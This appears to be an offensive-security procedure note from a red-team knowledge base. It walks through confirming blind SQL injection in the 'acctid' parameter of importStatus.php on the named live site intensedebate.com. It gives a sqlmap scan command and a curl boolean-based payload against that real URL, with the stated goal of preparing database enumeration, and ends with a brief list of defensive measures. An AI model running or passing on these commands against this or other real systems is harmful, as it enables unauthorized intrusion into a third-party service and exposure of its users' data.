---
tags:
  - sqli
  - web
  - recon
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqlmap-initial-test]]'
  - '[[commands/boolean-sqli-payload]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.324Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: e8c55ec7-3206-4294-bdff-9b9afba6e5e7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-Vulnerable-SQL-Injection-Parameter

## Summary

This procedure identifies SQL Injection vulnerabilities in web application parameters by testing for response differences with injected payloads, focusing on blind techniques to confirm exploitability without direct error messages.

## Description

In a PHP-based web application like intensedebate.com, the 'acctid' GET parameter in importStatus.php lacks input sanitization, allowing SQL payloads to alter query behavior. This procedure uses manual testing and sqlmap to detect boolean-based and time-based blind SQLi, enabling enumeration of backend MySQL databases. Prerequisites include network access to the endpoint and basic curl or browser tools; expected outcomes are confirmation of injection points leading to data exposure risks.

## Requirements

1. Network access to https://www.intensedebate.com/js/importStatus.php
2. Installed sqlmap tool
3. curl or web browser for manual payload testing

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries in PHP code
- Use web application firewalls (WAF) to block SQLi patterns
- Monitor application logs for anomalous response times or payload attempts

## Objectives

1. Confirm SQL Injection in the 'acctid' parameter
2. Identify blind injection types (boolean/time-based)
3. Prepare for database enumeration

## Instructions

### Step 1: Access and Test Basic Injection

**Context**: Start by accessing the endpoint with a normal parameter value to establish baseline response.

**Command** ([[commands/sqlmap-initial-test]]):
```bash
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --batch
```

> This runs an initial sqlmap scan to detect the injectable parameter without user interaction. Expected output includes detection of boolean-based blind or time-based blind SQLi.

### Step 2: Test Boolean-Based Payload

**Context**: Inject a true condition payload to observe if the application responds normally, indicating injection success.

**Command** ([[commands/boolean-sqli-payload]]):
```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND 1726=1726"
```

> Appends SQL logic to the query; normal page load confirms true condition and vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-initial-test]]
- [[commands/boolean-sqli-payload]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- sqli
- blind-sqli
